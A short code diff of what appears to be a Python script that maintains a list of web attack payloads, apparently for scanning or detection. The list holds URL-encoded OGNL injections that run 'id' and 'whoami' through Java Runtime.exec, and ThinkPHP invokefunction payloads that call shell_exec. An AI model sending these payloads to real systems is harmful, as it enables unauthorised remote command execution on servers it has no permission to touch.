@@ -138,6 +138,8 @@ for doing in doings:
         findings.append("dns-query?dns=bG9jYWxob3N0")
         findings = [_ for _ in findings if not "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils" in _]
         findings.append("%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D//")
+        findings = [_ for _ in findings if not "%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec" in _]
+        findings.append("%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29%7D/")
         findings = [_ for _ in findings if not "function=call_user_func_array&vars[0]=md5&vars[1][]=" in _]
         findings.append("s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4jyqfh7x")
         findings = [_ for _ in findings if not "invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id" in _]
